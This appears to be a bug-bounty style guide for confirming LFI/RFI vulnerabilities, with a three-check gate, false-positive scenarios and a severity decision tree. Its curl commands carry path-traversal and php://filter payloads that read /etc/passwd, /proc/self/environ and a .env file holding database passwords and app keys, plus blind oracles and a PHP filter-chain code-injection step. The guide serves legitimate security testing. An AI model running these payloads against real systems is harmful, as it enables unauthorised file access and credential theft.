# LFI-RFI Hunter — Zero False Positive Verification Guide

## The Three-Check Gate

Every LFI/RFI finding MUST pass ALL three verification checks before reporting.

### CHECK 1 — Content Confirmation
**Goal**: Verify the response contains real file content (not an error, not a placeholder).

```
PASS conditions:
  - /etc/passwd → "root:x:0:0:" present
  - /etc/hostname → single word server name
  - PHP filter → valid base64 that decodes to PHP code
  - /proc/self/environ → KEY=VALUE pairs with PATH, SERVER_SOFTWARE etc.

FAIL conditions:
  - Empty response
  - "File not found" / "404"
  - "Access denied" / "403"
  - Same response for every file tested
  - Response contains your payload string echoed back (reflection, not inclusion)
```

### CHECK 2 — Not Static/Cached
**Goal**: Prove it's actually including the file server-side.

```
PASS conditions:
  - Read /etc/hostname → different hostname per server (test if multiple backends)
  - Read two different files → different content each time
  - Read /proc/self/environ twice → values differ (timestamps, etc.)
  - PHP filter on index.php → returns actual base64-encoded source code

FAIL conditions:
  - All file reads return the same content
  - /etc/hostname returns "localhost" always
  - Content is clearly a default/placeholder page
```

### CHECK 3 — Multiple Files
**Goal**: Prove arbitrary file read, not a single hardcoded file.

```
PASS conditions:
  - Read /etc/passwd AND /etc/hostname AND /proc/self/environ
  - OR: Read one sensitive file + PHP filter on source code
  - All return DIFFERENT content matching expected file

FAIL conditions:
  - Only one specific file works
  - Only .txt files work (limited extension)
  - Only files in one directory work
```

## False Positive Scenarios

### Scenario 1: Reflection (false positive)
```
Request:  /page=../../../etc/passwd
Response: "The file ../../../etc/passwd was not found"
This is NOT LFI. The input is just echoed back. ❌
```

### Scenario 2: Default error page (false positive)
```
Request:  /page=../../../etc/passwd
Response: 404 page with "requested document /etc/passwd not available"
This is NOT LFI. The server resolved the path but the file is not accessible. ❌
```

### Scenario 3: Hardcoded include (false positive)
```
Request:  /page=../../../etc/passwd  →  "root:x:0:0:"
Request:  /page=../../../etc/shadow  →  same "root:x:0:0:" content
This means the page ALWAYS includes /etc/passwd regardless of param. ❌
```

### Scenario 4: Static placeholder (false positive)
```
Request:  /page=../../../etc/passwd  →  "Server: ubuntu"
Request:  /page=anything             →  "Server: ubuntu"
The server is returning the same value regardless of input. ❌
```

## Verification Commands

```bash
# === CHECK 1: Content confirmation ===
curl -sk "https://TARGET/page=../../../etc/passwd" | grep -c "root:x"
# Return > 0 = PASS

# === CHECK 2: Non-static ===
curl -sk "https://TARGET/page=../../../etc/hostname"
# Should return a hostname, not "localhost"

# === CHECK 3: Multiple files ===
curl -sk "https://TARGET/page=../../../etc/passwd" | head -3
curl -sk "https://TARGET/page=../../../etc/hostname" | head -3
curl -sk "https://TARGET/page=../../../proc/self/environ" | head -5
# All three should return DIFFERENT content

# === BONUS: Source code ===
curl -sk "https://TARGET/page=php://filter/convert.base64-encode/resource=index.php"
# Should return base64 (starts with PD9waHA for PHP files)

# === BONUS: Impact escalation ===
curl -sk "https://TARGET/page=../../../var/www/html/.env"
# Should show DB_PASS, APP_KEY, etc.
```

## Blind/Oracle LFI Verification

When response body doesn't reveal file content:

```bash
# Error-based oracle
# File exists → different error than file doesn't exist
curl -sk "https://TARGET/page=../../../etc/passwd" -w "\nHTTP_CODE: %{http_code}\n"
curl -sk "https://TARGET/page=../../../etc/nonexistent" -w "\nHTTP_CODE: %{http_code}\n"
# Different code/error = potential LFI

# Time-based oracle
# Large file inclusion may take longer
time curl -sk "https://TARGET/page=../../../etc/passwd" -o /dev/null -w "%{time_total}\n"
time curl -sk "https://TARGET/page=../../../etc/nonexistent" -o /dev/null -w "%{time_total}\n"
# Significant time difference = potential LFI

# PHP filter chain oracle (Lightyear / Synacktiv)
# For advanced blind exploitation
python3 php_filter_chain_generator.py --chain "<?php echo 'LFI_CONFIRMED'; ?>"
```

## Report Decision Tree

```
Found LFI? → Apply 3-check gate
  ├── All 3 checks PASS → REPORT
  │   └── Determine impact:
  │       ├── Source code readable? → HIGH
  │       ├── Secrets/creds readable? → CRITICAL
  │       ├── RCE via log poisoning? → CRITICAL
  │       ├── Cloud metadata? → CRITICAL
  │       └── Only /etc/passwd? → MEDIUM
  │
  ├── Only 2 of 3 PASS → Keep testing
  │   └── Add more payloads, try bypasses
  │
  └── Less than 2 PASS → NOT LFI, discard
      └── Could be:
          ├── Reflection (input echoed back)
          ├── Static error page
          ├── Hardcoded include
          └── WAF block
```
